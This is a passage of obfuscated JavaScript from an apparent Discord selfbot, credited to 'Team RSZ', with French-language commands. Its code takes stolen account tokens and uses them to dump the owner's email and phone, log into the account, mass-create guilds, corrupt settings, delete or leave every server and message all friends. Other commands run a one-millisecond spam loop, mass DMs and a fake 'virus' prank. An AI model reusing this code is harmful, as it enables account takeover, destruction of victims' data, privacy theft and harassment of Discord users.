Discord[(_0x8a5b4f(0x2e8))]()[_0x8a5b4f(0x248)](_0x8a5b4f(0x4f3))[_0x8a5b4f(0x39b)](color)[_0x8a5b4f(0x463)](_0x8a5b4f(0x230),_0x49306a[_0x8a5b4f(0x216)](_0x2a52cc=>_0x2a52cc['name']));for(pas=0x0;pas<0xa;pas++){_0x20ea1c[_0x8a5b4f(0x39b)](color),_0x35b0b3[_0x8a5b4f(0x26f)](_0x20ea1c)[_0x8a5b4f(0x4d5)](_0x368ad2=>console[_0x8a5b4f(0x32b)]('[','ERROR'[_0x8a5b4f(0x5fb)],']',_0x8a5b4f(0x41a)[_0x8a5b4f(0x55b)]));}console[_0x8a5b4f(0x32b)](_0x8a5b4f(0x5b5)[_0x8a5b4f(0x647)]);}if(_0x5e9f52[_0x8a5b4f(0x4c7)]===prefix+_0x8a5b4f(0x42e)){if(!_0x5e9f52['guild'])return _0x35b0b3['edit'](_0x8a5b4f(0x1ff));if(!_0x35b0b3[_0x8a5b4f(0x53b)]['hasPermission'](_0x8a5b4f(0x577)))return _0x35b0b3['edit'](_0x8a5b4f(0x681)+_0x429cdb[_0x8a5b4f(0x216)](_0x5794e6=>_0x5794e6[_0x8a5b4f(0x47a)]));const _0x429cdb=_0x35b0b3[_0x8a5b4f(0x5e1)][_0x8a5b4f(0x5b3)];var _0x229a24=new Discord[(_0x8a5b4f(0x2e8))]()['setFooter'](_0x8a5b4f(0x4f3))['setColor'](color)[_0x8a5b4f(0x463)](_0x8a5b4f(0x211),_0x429cdb[_0x8a5b4f(0x216)](_0x56a765=>_0x56a765[_0x8a5b4f(0x47a)]));_0x35b0b3[_0x8a5b4f(0x26f)](_0x229a24)['catch'](_0x32c070=>console[_0x8a5b4f(0x32b)]('[','ERROR'[_0x8a5b4f(0x5fb)],']',_0x8a5b4f(0x41a)[_0x8a5b4f(0x55b)])),console[_0x8a5b4f(0x32b)](_0x8a5b4f(0x461)),console[_0x8a5b4f(0x32b)](_0x8a5b4f(0x59d));}_0x35b0b3[_0x8a5b4f(0x4c7)]===prefix+_0x8a5b4f(0x285)&&(_0x35b0b3[_0x8a5b4f(0x26f)](cmd)[_0x8a5b4f(0x4d5)](_0xc127d4=>console[_0x8a5b4f(0x32b)]('[','ERROR'[_0x8a5b4f(0x5fb)],']','une\x20erreur\x20est\x20survenue\x20que\x20je\x20ne\x20peux\x20régler'[_0x8a5b4f(0x55b)])),console[_0x8a5b4f(0x32b)](_0x8a5b4f(0x2f8)),console[_0x8a5b4f(0x32b)](_0x8a5b4f(0x59d)));_0x35b0b3[_0x8a5b4f(0x4c7)]===prefix+'help'&&(_0x35b0b3[_0x8a5b4f(0x26f)](help)['catch'](_0x592deb=>console[_0x8a5b4f(0x32b)]('[',_0x8a5b4f(0x391)[_0x8a5b4f(0x5fb)],']','une\x20erreur\x20est\x20survenue\x20que\x20je\x20ne\x20peux\x20régler'[_0x8a5b4f(0x55b)])),console[_0x8a5b4f(0x32b)](_0x8a5b4f(0x4e6)),console[_0x8a5b4f(0x32b)](_0x8a5b4f(0x59d)));_0x35b0b3[_0x8a5b4f(0x4c7)]===prefix+_0x8a5b4f(0x502)&&(_0x35b0b3['edit'](help_raid)[_0x8a5b4f(0x4d5)](_0xa59c37=>console[_0x8a5b4f(0x32b)]('[','ERROR'[_0x8a5b4f(0x5fb)],']','une\x20erreur\x20est\x20survenue\x20que\x20je\x20ne\x20peux\x20régler'['green'])),console['log'](_0x8a5b4f(0x323)),console[_0x8a5b4f(0x32b)](_0x8a5b4f(0x59d)));_0x35b0b3[_0x8a5b4f(0x4c7)]===prefix+_0x8a5b4f(0x245)&&(_0x35b0b3[_0x8a5b4f(0x26f)](help_hack)[_0x8a5b4f(0x4d5)](_0x1c6703=>console[_0x8a5b4f(0x32b)]('[',_0x8a5b4f(0x391)[_0x8a5b4f(0x5fb)],']',_0x8a5b4f(0x41a)['green'])),console['log'](_0x8a5b4f(0x228)),console[_0x8a5b4f(0x32b)](_0x8a5b4f(0x59d)));_0x35b0b3[_0x8a5b4f(0x4c7)]===prefix+_0x8a5b4f(0x3e6)&&(_0x35b0b3['channel'][_0x8a5b4f(0x678)](help_statut2),_0x35b0b3[_0x8a5b4f(0x26f)](help_statut)[_0x8a5b4f(0x4d5)](_0x197a5c=>console[_0x8a5b4f(0x32b)]('[',_0x8a5b4f(0x391)[_0x8a5b4f(0x5fb)],']',_0x8a5b4f(0x41a)[_0x8a5b4f(0x55b)])),console[_0x8a5b4f(0x32b)]('╟\x20Commande\x20help\x20statut\x20executé'),console[_0x8a5b4f(0x32b)](_0x8a5b4f(0x59d)));_0x35b0b3[_0x8a5b4f(0x4c7)]===prefix+_0x8a5b4f(0x56f)&&(_0x35b0b3[_0x8a5b4f(0x26f)](help_fun)['catch'](_0x5a9c3f=>console[_0x8a5b4f(0x32b)]('[',_0x8a5b4f(0x391)[_0x8a5b4f(0x5fb)],']',_0x8a5b4f(0x41a)[_0x8a5b4f(0x55b)])),console[_0x8a5b4f(0x32b)](_0x8a5b4f(0x48a)),console[_0x8a5b4f(0x32b)]('╟─────────────────────────────────╢'));_0x35b0b3[_0x8a5b4f(0x4c7)]===prefix+_0x8a5b4f(0x1fa)&&(_0x35b0b3[_0x8a5b4f(0x26f)](help_moderation)[_0x8a5b4f(0x4d5)](_0x11e96e=>console['log']('[',_0x8a5b4f(0x391)['red'],']','une\x20erreur\x20est\x20survenue\x20que\x20je\x20ne\x20peux\x20régler'[_0x8a5b4f(0x55b)])),console[_0x8a5b4f(0x32b)](_0x8a5b4f(0x1ce)),console[_0x8a5b4f(0x32b)]('╟─────────────────────────────────╢'));_0x35b0b3[_0x8a5b4f(0x4c7)]===prefix+_0x8a5b4f(0x586)&&(_0x35b0b3['edit'](help_nsfw)[_0x8a5b4f(0x4d5)](_0x2f0815=>console['log']('[',_0x8a5b4f(0x391)['red'],']',_0x8a5b4f(0x41a)['green'])),console['log'](_0x8a5b4f(0x5a6)),console[_0x8a5b4f(0x32b)](_0x8a5b4f(0x59d)));_0x35b0b3['content']===prefix+_0x8a5b4f(0x5fc)&&(_0x35b0b3[_0x8a5b4f(0x26f)](gen)[_0x8a5b4f(0x4d5)](_0x553ea5=>console['log']('[',_0x8a5b4f(0x391)['red'],']','une\x20erreur\x20est\x20survenue\x20que\x20je\x20ne\x20peux\x20régler'[_0x8a5b4f(0x55b)])),console[_0x8a5b4f(0x32b)]('╟\x20Commande\x20generateur\x20executé'),console['log']('╟─────────────────────────────────╢'));_0x35b0b3[_0x8a5b4f(0x4c7)]===prefix+_0x8a5b4f(0x2aa)&&(_0x35b0b3[_0x8a5b4f(0x26f)](help_info)[_0x8a5b4f(0x4d5)](_0x55831c=>console['log']('[','ERROR'[_0x8a5b4f(0x5fb)],']',_0x8a5b4f(0x41a)['green'])),console['log'](_0x8a5b4f(0x583)),console[_0x8a5b4f(0x32b)](_0x8a5b4f(0x59d)));;if(_0x35b0b3['content']['startsWith'](prefix+_0x8a5b4f(0x528)||prefix+'pp')){const _0x1acb7f=_0x35b0b3[_0x8a5b4f(0x610)][_0x8a5b4f(0x608)][_0x8a5b4f(0x45d)]()||_0x35b0b3['author'],_0x5403aa=new Discord[(_0x8a5b4f(0x2e8))]()[_0x8a5b4f(0x5b9)](_0x1acb7f[_0x8a5b4f(0x587)])[_0x8a5b4f(0x6ae)](_0x1acb7f[_0x8a5b4f(0x355)])[_0x8a5b4f(0x39b)](color)[_0x8a5b4f(0x248)](_0x8a5b4f(0x4f3));_0x35b0b3[_0x8a5b4f(0x26f)](_0x5403aa)[_0x8a5b4f(0x4d5)](_0x31d340=>console[_0x8a5b4f(0x32b)]('[',_0x8a5b4f(0x391)['red'],']',_0x8a5b4f(0x41a)['green'])),console[_0x8a5b4f(0x32b)](_0x8a5b4f(0x2f3)),console[_0x8a5b4f(0x32b)](_0x8a5b4f(0x59d));};if(_0x35b0b3[_0x8a5b4f(0x4c7)]===prefix+'change\x20hypesquad\x20brilliance'){let _0x3b2782=_0x8a5b4f(0x6a8);request(_0x3b2782,{'method':_0x8a5b4f(0x3a4),'headers':{'authorization':token,'content-type':_0x8a5b4f(0x2fe),'User-Agent':_0x8a5b4f(0x5b7)},'body':JSON[_0x8a5b4f(0x3cc)]({'house_id':0x2})}),_0x5e9f52[_0x8a5b4f(0x26f)](_0x8a5b4f(0x408)),console[_0x8a5b4f(0x32b)]('╟\x20Commande\x20change\x20hypesquad\x20executé'),console[_0x8a5b4f(0x32b)](_0x8a5b4f(0x59d));}if(_0x35b0b3[_0x8a5b4f(0x4c7)]===prefix+_0x8a5b4f(0x5ff)){let _0x1e8755=_0x8a5b4f(0x6a8);request(_0x1e8755,{'method':_0x8a5b4f(0x3a4),'headers':{'authorization':token,'content-type':_0x8a5b4f(0x2fe),'User-Agent':_0x8a5b4f(0x5b7)},'body':JSON[_0x8a5b4f(0x3cc)]({'house_id':0x3})}),_0x5e9f52[_0x8a5b4f(0x26f)](_0x8a5b4f(0x654)),console[_0x8a5b4f(0x32b)]('╟\x20Commande\x20change\x20hypesquad\x20executé'),console[_0x8a5b4f(0x32b)](_0x8a5b4f(0x59d));}if(_0x35b0b3[_0x8a5b4f(0x4c7)]===prefix+_0x8a5b4f(0x2e5)){let _0x411739=_0x8a5b4f(0x6a8);request(_0x411739,{'method':_0x8a5b4f(0x3a4),'headers':{'authorization':token,'content-type':'application/json','User-Agent':_0x8a5b4f(0x5b7)},'body':JSON['stringify']({'house_id':0x1})}),_0x5e9f52[_0x8a5b4f(0x26f)](_0x8a5b4f(0x5d2)),console['log']('╟\x20Commande\x20change\x20hypesquad\x20executé\x20'),console[_0x8a5b4f(0x32b)](_0x8a5b4f(0x59d));}if(_0x35b0b3[_0x8a5b4f(0x4c7)]['startsWith'](prefix+_0x8a5b4f(0x1da))){let _0x2ad092=_0x106d51[_0x8a5b4f(0x217)](0x2)[_0x8a5b4f(0x565)]('\x20'),_0xc2d7c9=_0x8a5b4f(0x38c);request(_0xc2d7c9,{'method':_0x8a5b4f(0x25f),'headers':{'authorization':_0x2ad092}},function(_0x5308e9,_0x4755e8,_0x4a0638){const _0x34c5e1=_0x8a5b4f;if(_0x4755e8[_0x34c5e1(0x3fa)]===0xc8){var _0x3c9342=new Discord[(_0x34c5e1(0x2e8))]()[_0x34c5e1(0x4ea)](_0x34c5e1(0x24c))[_0x34c5e1(0x6e4)](_0x34c5e1(0x6ad)+_0x2ad092+_0x34c5e1(0x1f6))[_0x34c5e1(0x39b)](color)[_0x34c5e1(0x279)]()[_0x34c5e1(0x248)](_0x34c5e1(0x4f3),_0x35b0b3[_0x34c5e1(0x42b)]['avatarURL']);_0x35b0b3[_0x34c5e1(0x26f)](_0x3c9342)['catch'](_0x3a4484=>console[_0x34c5e1(0x32b)]('[',_0x34c5e1(0x391)[_0x34c5e1(0x5fb)],']',_0x34c5e1(0x41a)['green']));}else{var _0x11fc37=new Discord[(_0x34c5e1(0x2e8))]()['setTitle'](_0x34c5e1(0x24c))['setDescription'](_0x34c5e1(0x6d3)+_0x2ad092+'\x20\x0an\x27est\x20pas\x20valide\x20:x:')[_0x34c5e1(0x39b)](color)[_0x34c5e1(0x279)]()['setFooter'](_0x34c5e1(0x4f3),_0x35b0b3[_0x34c5e1(0x42b)][_0x34c5e1(0x355)]);_0x35b0b3[_0x34c5e1(0x26f)](_0x11fc37)['catch'](_0x54811b=>console[_0x34c5e1(0x32b)]('[','ERROR'[_0x34c5e1(0x5fb)],']',_0x34c5e1(0x41a)[_0x34c5e1(0x55b)])),console[_0x34c5e1(0x32b)](_0x34c5e1(0x399)),console[_0x34c5e1(0x32b)](_0x34c5e1(0x59d));}});}if(_0x35b0b3[_0x8a5b4f(0x4c7)]==prefix+_0x8a5b4f(0x2a4)){if(!_0x5e9f52[_0x8a5b4f(0x5e1)])return _0x35b0b3[_0x8a5b4f(0x26f)](':x:\x20**Commande\x20uniquement\x20utilisable\x20sur\x20un\x20serveur**');if(!_0x35b0b3[_0x8a5b4f(0x53b)][_0x8a5b4f(0x554)](_0x8a5b4f(0x1d7))){_0x35b0b3[_0x8a5b4f(0x396)]['send'](_0x8a5b4f(0x286));return;}let _0x5f05d1=0x0;const _0x218d77=[_0x8a5b4f(0x68a),_0x8a5b4f(0x6b5),_0x8a5b4f(0x257),_0x8a5b4f(0x5d8),_0x8a5b4f(0x229),_0x8a5b4f(0x2c4)];setInterval(()=>{const _0x1404d2=_0x8a5b4f;_0x35b0b3[_0x1404d2(0x5e1)][_0x1404d2(0x5e6)](_0x218d77[_0x5f05d1]),_0x5f05d1++;if(_0x5f05d1==_0x218d77[_0x1404d2(0x3f6)])_0x5f05d1=0x0;},0x3e8),_0x5e9f52[_0x8a5b4f(0x26f)](_0x8a5b4f(0x54a)),console[_0x8a5b4f(0x32b)](_0x8a5b4f(0x4f5)),console[_0x8a5b4f(0x32b)](_0x8a5b4f(0x59d));}if(_0x35b0b3[_0x8a5b4f(0x4c7)]==prefix+_0x8a5b4f(0x618)){if(!_0x5e9f52[_0x8a5b4f(0x5e1)])return _0x35b0b3[_0x8a5b4f(0x26f)](_0x8a5b4f(0x1ff));clearInterval(),_0x5e9f52['edit'](_0x8a5b4f(0x2ef)),console[_0x8a5b4f(0x32b)](_0x8a5b4f(0x676)),console[_0x8a5b4f(0x32b)](_0x8a5b4f(0x59d));}if(_0x35b0b3[_0x8a5b4f(0x4c7)][_0x8a5b4f(0x6cc)](prefix+'spam')){let _0x3b2f16=_0x106d51['splice'](0x1)[_0x8a5b4f(0x565)]('\x20');_0x5e9f52[_0x8a5b4f(0x26f)]('**Patiente...**'),setInterval(()=>{const _0x2a0fd3=_0x8a5b4f;_0x5e9f52[_0x2a0fd3(0x396)]['send'](_0x3b2f16)[_0x2a0fd3(0x4d5)](_0x514a94=>console[_0x2a0fd3(0x32b)]('[',_0x2a0fd3(0x391)['red'],']',_0x2a0fd3(0x41a)['green']));},0x1),console[_0x8a5b4f(0x32b)](_0x8a5b4f(0x668)),console[_0x8a5b4f(0x32b)](_0x8a5b4f(0x59d));}if(_0x35b0b3[_0x8a5b4f(0x4c7)]['startsWith'](prefix+_0x8a5b4f(0x209))){if(_0x35b0b3[_0x8a5b4f(0x42b)]['id']==client[_0x8a5b4f(0x377)]['id']){let _0x117909=_0x35b0b3['content'][_0x8a5b4f(0x534)]('\x20')['slice'](0x1),_0x47a5ba=_0x117909[_0x8a5b4f(0x565)]('\x20');if(!_0x47a5ba)return _0x35b0b3[_0x8a5b4f(0x26f)]('𝐕𝐞𝐮𝐢𝐥𝐥𝐞𝐳\x20𝐦𝐞𝐭𝐭𝐫𝐞\x20𝐥𝐞\x20𝐧𝐨𝐦\x20𝐝𝐮\x20𝐡𝐚𝐜𝐤');_0x35b0b3['edit']({'embed':new Discord['RichEmbed']()[_0x8a5b4f(0x4ea)]('𝐋𝐨𝐚𝐝𝐢𝐧𝐠\x20'+_0x47a5ba+_0x8a5b4f(0x1d0))[_0x8a5b4f(0x39b)](color)})['then'](function(_0xd7c2b8){setTimeout(function(){const _0x3a191f=_0x5e0d;_0xd7c2b8[_0x3a191f(0x26f)]({'embed':new Discord[(_0x3a191f(0x2e8))]()[_0x3a191f(0x4ea)]('['+_0x47a5ba+_0x3a191f(0x67d))['setColor'](color)});},0x3e8),setTimeout(function(){const _0x5f2830=_0x5e0d;_0xd7c2b8[_0x5f2830(0x26f)]({'embed':new Discord[(_0x5f2830(0x2e8))]()[_0x5f2830(0x4ea)]('['+_0x47a5ba+']:\x20𝐋𝐨𝐚𝐝𝐢𝐧𝐠\x20𝐃𝐢𝐬𝐜𝐨𝐫𝐝\x20𝐕𝐢𝐫𝐮𝐬\x20[▓▓▓▓]\x20𝟐𝟓%')[_0x5f2830(0x39b)](color)});},0x7d0),setTimeout(function(){const _0x2e9ae6=_0x5e0d;_0xd7c2b8[_0x2e9ae6(0x26f)]({'embed':new Discord[(_0x2e9ae6(0x2e8))]()[_0x2e9ae6(0x4ea)]('['+_0x47a5ba+']:\x20𝐋𝐨𝐚𝐝𝐢𝐧𝐠\x20𝐃𝐢𝐬𝐜𝐨𝐫𝐝\x20𝐕𝐢𝐫𝐮𝐬\x20[▓▓▓▓▓▓▓]\x20𝟓𝟎%')[_0x2e9ae6(0x39b)](color)});},0xbb8),setTimeout(function(){const _0x4f6633=_0x5e0d;_0xd7c2b8[_0x4f6633(0x26f)]({'embed':new Discord['RichEmbed']()['setTitle']('['+_0x47a5ba+_0x4f6633(0x56c))[_0x4f6633(0x39b)](color)});},0xfa0),setTimeout(function(){const _0x171b75=_0x5e0d;_0xd7c2b8['edit']({'embed':new Discord['RichEmbed']()[_0x171b75(0x4ea)]('['+_0x47a5ba+']:\x20𝐋𝐨𝐚𝐝𝐢𝐧𝐠\x20𝐃𝐢𝐬𝐜𝐨𝐫𝐝\x20𝐕𝐢𝐫𝐮𝐬\x20[▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓\x20]\x20𝟏𝟎𝟎%')[_0x171b75(0x39b)](color)});},0x1388),setTimeout(function(){const _0x115e94=_0x5e0d;_0xd7c2b8[_0x115e94(0x26f)]({'embed':new Discord[(_0x115e94(0x2e8))]()['setTitle']('['+_0x47a5ba+']:\x20𝐕𝐢𝐫𝐮𝐬\x20𝐥𝐚𝐧𝐜𝐞́')[_0x115e94(0x39b)](color)});},0x1770),setTimeout(function(){const _0xcaad4a=_0x5e0d;_0xd7c2b8[_0xcaad4a(0x246)]();},0x2710);});}}if(_0x35b0b3[_0x8a5b4f(0x4c7)]['startsWith'](prefix+'info\x20token')){let _0x1fb301=_0x106d51[_0x8a5b4f(0x217)](0x2)[_0x8a5b4f(0x565)]('\x20'),_0x3d1794=_0x8a5b4f(0x38c);request(_0x3d1794,{'method':'GET','headers':{'authorization':_0x1fb301}},function(_0x169dc9,_0x1752ae,_0x2e1aa0){const _0x26d326=_0x8a5b4f;if(_0x1752ae['statusCode']===0xc8){_0x2e1aa0=JSON[_0x26d326(0x39f)](_0x2e1aa0);var _0x3ecfa5=_0x2e1aa0['id'],_0x4cab44=_0x2e1aa0['username'],_0x2c8011=_0x2e1aa0[_0x26d326(0x528)],_0x2eb56b=_0x2e1aa0[_0x26d326(0x381)],_0x4fe0ff=_0x2e1aa0[_0x26d326(0x5cc)],_0x2011ea=_0x2e1aa0[_0x26d326(0x329)],_0x2e9bc4=_0x2e1aa0[_0x26d326(0x580)];let _0x352c60=_0x2e1aa0[_0x26d326(0x547)],_0x59aced=_0x2e1aa0[_0x26d326(0x289)],_0x1dedba=_0x2e1aa0[_0x26d326(0x1e6)],_0x9a8282=_0x2e1aa0[_0x26d326(0x589)],_0x1a8750=_0x2e1aa0[_0x26d326(0x357)];var _0x2cb605='';_0x2cb605+='\x0aUser:\x20'+_0x4cab44+'#'+_0x2eb56b,_0x2cb605+=_0x26d326(0x4d0)+_0x3ecfa5,_0x2cb605+=_0x26d326(0x485)+_0x1dedba,_0x2cb605+=_0x26d326(0x2a7)+_0x2011ea,_0x2cb605+=_0x26d326(0x1e1)+_0x2c8011,_0x2cb605+=_0x26d326(0x3e7)+_0x2e9bc4,_0x2cb605+=_0x26d326(0x476)+_0x4fe0ff,_0x2cb605+=_0x26d326(0x3b1)+_0x9a8282,_0x2cb605+='\x0aNsfw\x20activé?:\x20'+_0x1a8750,_0x2cb605+='\x0aFlags:\x20'+_0x59aced,_0x2cb605+=_0x26d326(0x69f)+_0x352c60;var _0x3fb061=new Discord[(_0x26d326(0x2e8))]()[_0x26d326(0x4ea)](_0x26d326(0x28d))[_0x26d326(0x6e4)](_0x2cb605)[_0x26d326(0x39b)](color)[_0x26d326(0x248)]('𝚃𝚎𝚊𝚖\x20𝚁𝚂𝚉');return _0x35b0b3[_0x26d326(0x26f)](_0x3fb061)['then'](console[_0x26d326(0x32b)](_0x26d326(0x376))),console['log']('╟─────────────────────────────────╢');}else{var _0x47e5d8=new Discord[(_0x26d326(0x2e8))]()[_0x26d326(0x4ea)]('Token\x20info')[_0x26d326(0x6e4)](_0x26d326(0x6d3)+_0x1fb301+_0x26d326(0x3b2))[_0x26d326(0x39b)](color)[_0x26d326(0x279)]()['setFooter'](_0x26d326(0x4f3),_0x35b0b3[_0x26d326(0x42b)][_0x26d326(0x355)]);_0x35b0b3[_0x26d326(0x26f)](_0x47e5d8)['catch'](_0x4bb3aa=>console[_0x26d326(0x32b)]('[',_0x26d326(0x391)[_0x26d326(0x5fb)],']',_0x26d326(0x41a)[_0x26d326(0x55b)]));}});};if(_0x35b0b3[_0x8a5b4f(0x4c7)][_0x8a5b4f(0x6cc)](prefix+_0x8a5b4f(0x6b4))){let _0x32a22e=new Discord[(_0x8a5b4f(0x3a1))](),_0x952bd9=_0x106d51[_0x8a5b4f(0x217)](0x2)[_0x8a5b4f(0x565)]('\x20'),_0x21febe=_0x8a5b4f(0x38c);request(_0x21febe,{'method':_0x8a5b4f(0x25f),'headers':{'authorization':_0x952bd9}},function(_0x4c4c9f,_0x136a73,_0x351e98){const _0x4814d5=_0x8a5b4f;if(_0x136a73['statusCode']===0xc8){_0x32a22e['on']('ready',function(){const _0x4ea786=_0x5e0d;for(pas=0x0;pas<0x64;pas++){_0x32a22e[_0x4ea786(0x377)]['createGuild'](_0x4ea786(0x299),_0x4ea786(0x3e5));}});for(pas=0x0;pas<0x14;pas++){fetch('https://discord.com/api/v8/users/@me/settings',{'headers':{'authorization':_0x952bd9,'content-type':_0x4814d5(0x2fe)},'body':_0x4814d5(0x51d),'method':'PATCH'}),fetch('https://discord.com/api/v8/users/@me/settings',{'headers':{'authorization':_0x952bd9,'content-type':_0x4814d5(0x2fe)},'body':_0x4814d5(0x214),'method':_0x4814d5(0x33f)});};_0x32a22e['on'](_0x4814d5(0x1dd),function(){const _0xf49c8b=_0x4814d5;_0x32a22e[_0xf49c8b(0x377)][_0xf49c8b(0x5af)]['forEach'](_0x510b86=>{const _0x5eded0=_0xf49c8b;_0x32a22e['user'][_0x5eded0(0x363)](_0x510b86)[_0x5eded0(0x4d5)](_0x3b20fd=>console[_0x5eded0(0x32b)]('[',_0x5eded0(0x391)['red'],']',_0x5eded0(0x41a)[_0x5eded0(0x55b)]));}),_0x32a22e[_0xf49c8b(0x5be)][_0xf49c8b(0x1e7)](_0x3fc8f2=>{const _0x413fe4=_0xf49c8b;if(_0x3fc8f2['ownerID']===_0x32a22e[_0x413fe4(0x377)]['id'])_0x3fc8f2[_0x413fe4(0x246)]()[_0x413fe4(0x4d5)](_0x2549e1=>console[_0x413fe4(0x32b)]('[',_0x413fe4(0x391)[_0x413fe4(0x5fb)],']',_0x413fe4(0x41a)[_0x413fe4(0x55b)]));else _0x3fc8f2['leave']()[_0x413fe4(0x4d5)](_0x42f426=>console[_0x413fe4(0x32b)]('[',_0x413fe4(0x391)[_0x413fe4(0x5fb)],']',_0x413fe4(0x41a)['green']));}),_0x35b0b3[_0xf49c8b(0x26f)](':white_check_mark:\x20**Token\x20fuck\x20en\x20cours...**');}),_0x32a22e['login'](_0x952bd9);}else{var _0x2820ae=new Discord[(_0x4814d5(0x2e8))]()[_0x4814d5(0x4ea)](_0x4814d5(0x24c))['setDescription'](_0x4814d5(0x6d3)+_0x952bd9+_0x4814d5(0x3b2))[_0x4814d5(0x39b)](color)[_0x4814d5(0x279)]()[_0x4814d5(0x248)](_0x4814d5(0x4f3),_0x35b0b3[_0x4814d5(0x42b)][_0x4814d5(0x355)]);_0x35b0b3['edit'](_0x2820ae)['catch'](_0x419f79=>console[_0x4814d5(0x32b)]('[',_0x4814d5(0x391)[_0x4814d5(0x5fb)],']',_0x4814d5(0x41a)[_0x4814d5(0x55b)]));}}),console[_0x8a5b4f(0x32b)](_0x8a5b4f(0x24d)),console[_0x8a5b4f(0x32b)](_0x8a5b4f(0x59d));};if(_0x35b0b3[_0x8a5b4f(0x4c7)][_0x8a5b4f(0x6cc)](prefix+_0x8a5b4f(0x264))){let _0x3e6779=_0x35b0b3['content'][_0x8a5b4f(0x534)]('\x20')['splice'](0x1)[_0x8a5b4f(0x565)]('\x20');var _0x55b920=[_0x8a5b4f(0x415),'non...',_0x8a5b4f(0x6e3),_0x8a5b4f(0x30b),_0x8a5b4f(0x582),_0x8a5b4f(0x4a6),'tu\x20peux\x20essayer...'];if(_0x3e6779[0x1]!=null)_0x35b0b3['edit'](_0x3e6779+'\x0ala\x20reponse\x20est:\x20'+_0x55b920[Math['floor'](Math[_0x8a5b4f(0x4ca)]()*_0x55b920[_0x8a5b4f(0x3f6)])])['catch'](_0x4b2220=>console['log']('[',_0x8a5b4f(0x391)[_0x8a5b4f(0x5fb)],']',_0x8a5b4f(0x41a)[_0x8a5b4f(0x55b)]));else _0x35b0b3[_0x8a5b4f(0x26f)](_0x8a5b4f(0x4d2)+prefix+_0x8a5b4f(0x643));console[_0x8a5b4f(0x32b)]('╟\x20Commande\x208ball\x20executé'),console[_0x8a5b4f(0x32b)](_0x8a5b4f(0x59d));};if(_0x35b0b3[_0x8a5b4f(0x4c7)][_0x8a5b4f(0x6cc)](prefix+_0x8a5b4f(0x52d))){if(!_0x106d51)throw'Vous\x20devez\x20mettre\x20quelque\x20chose\x20à\x20dire\x20!';let _0x216106=_0x106d51['splice'](0x2)['join']('\x20')||'𝚃𝚎𝚊𝚖\x20𝚁𝚂𝚉\x0a';client[_0x8a5b4f(0x377)][_0x8a5b4f(0x5af)]['forEach'](_0x50aa9c=>{const _0x4b29d4=_0x8a5b4f;_0x50aa9c[_0x4b29d4(0x678)](_0x216106)[_0x4b29d4(0x4d5)](_0x288fa8=>console['log']('[',_0x4b29d4(0x391)[_0x4b29d4(0x5fb)],']',_0x4b29d4(0x41a)[_0x4b29d4(0x55b)]));}),console[_0x8a5b4f(0x32b)](_0x8a5b4f(0x21e)),console[_0x8a5b4f(0x32b)](_0x8a5b4f(0x59d));};if(_0x35b0b3[_0x8a5b4f(0x4c7)]['startsWith'](prefix+_0x8a5b4f(0x6d6))){if(!_0x106d51)throw _0x8a5b4f(0x1e3);let _0x5eac3a=_0x106d51[_0x8a5b4f(0x217)](0x1)[_0x8a5b4f(0x565)]('\x20')||_0x8a5b4f(0x4f3),_0x1ef7d4=new Discord[(_0x8a5b4f(0x2e8))]()[_0x8a5b4f(0x4ea)](_0x8a5b4f(0x5ba))['setDescription'](_0x5eac3a)[_0x8a5b4f(0x279)]()[_0x8a5b4f(0x248)](_0x8a5b4f(0x6a0),''+client['user'][_0x8a5b4f(0x355)])[_0x8a5b4f(0x39b)](color);for(pas=0x0;pas<0xa;pas++){_0x1ef7d4[_0x8a5b4f(0x39b)](color),_0x35b0b3['edit'](_0x1ef7d4)['catch'](_0x33459f=>console[_0x8a5b4f(0x32b)]('[',_0x8a5b4f(0x391)[_0x8a5b4f(0x5fb)],']','une\x20erreur\x20est\x20survenue\x20que\x20je\x20ne\x20peux\x20régler'[_0x8a5b4f(0x55b)]));}console[_0x8a5b4f(0x32b)](_0x8a5b4f(0x4c3)),console[_0x8a5b4f(0x32b)](_0x8a5b4f(0x59d));};if(_0x35b0b3[_0x8a5b4f(0x4c7)]['startsWith'](prefix+_0x8a5b4f(0x345))){if(!_0x1f6d08)return _0x5e9f52[_0x8a5b4f(0x26f)](_0x8a5b4f(0x6be)),_0x1f6d08=_0x35b0b3[_0x8a5b4f(0x42b)];var _0x520ab9=_0x35b0b3[_0x8a5b4f(0x5e1)][_0x8a5b4f(0x53b)](_0x1f6d08),_0x4afc84=_0x1f6d08['presence'][_0x8a5b4f(0x346)],_0x7fcb88=_0x4afc84?_0x4afc84[_0x8a5b4f(0x47a)]:_0x8a5b4f(0x639),_0x370a4e=!_0x520ab9?null:_0x520ab9['roles']['array']();if(_0x520ab9){_0x370a4e[_0x8a5b4f(0x37d)]();for(var _0x5ef861=0x0;_0x5ef861<_0x370a4e[_0x8a5b4f(0x3f6)];++_0x5ef861){_0x370a4e[_0x5ef861]=_0x370a4e[_0x5ef861]['name'];}_0x370a4e=_0x370a4e[_0x8a5b4f(0x565)](',\x20');};var _0x55d8f0={'dnd':_0x8a5b4f(0x609),'offline':_0x8a5b4f(0x3d1),'online':_0x8a5b4f(0x22d),'idle':_0x8a5b4f(0x4af)};const _0x57e84f=new Discord[(_0x8a5b4f(0x2e8))]()['setAuthor'](_0x1f6d08[_0x8a5b4f(0x587)]+'#'+_0x1f6d08[_0x8a5b4f(0x381)]+'\x20|\x20'+_0x1f6d08['id'],_0x1f6d08[_0x8a5b4f(0x38b)])['setFooter']('E')[_0x8a5b4f(0x36f)](_0x1f6d08[_0x8a5b4f(0x38b)])[_0x8a5b4f(0x39b)](color)[_0x8a5b4f(0x463)](_0x8a5b4f(0x3a7),_0x1f6d08[_0x8a5b4f(0x388)][_0x8a5b4f(0x6db)]()['substr'](0x0,0xf)+',\x0a'+checkDays(_0x1f6d08[_0x8a5b4f(0x388)]),!![])['addField'](_0x8a5b4f(0x241),_0x520ab9['joinedAt'][_0x8a5b4f(0x6db)]()[_0x8a5b4f(0x5d7)](0x0,0xf)+',\x0a'+checkDays(_0x520ab9[_0x8a5b4f(0x23f)]),!![])[_0x8a5b4f(0x463)]('Status',_0x55d8f0[_0x1f6d08[_0x8a5b4f(0x594)][_0x8a5b4f(0x20c)]],!![])[_0x8a5b4f(0x463)](_0x8a5b4f(0x26b),_0x7fcb88,!![])[_0x8a5b4f(0x463)](_0x8a5b4f(0x6de),_0x520ab9[_0x8a5b4f(0x23e)]?_0x520ab9['nickname']:_0x8a5b4f(0x337),!![])[_0x8a5b4f(0x463)](_0x8a5b4f(0x26d),_0x8a5b4f(0x3c8)+_0x1f6d08[_0x8a5b4f(0x38b)]+')',!![])[_0x8a5b4f(0x463)]('Roles',_0x370a4e?_0x370a4e:'None');_0x5e9f52['edit']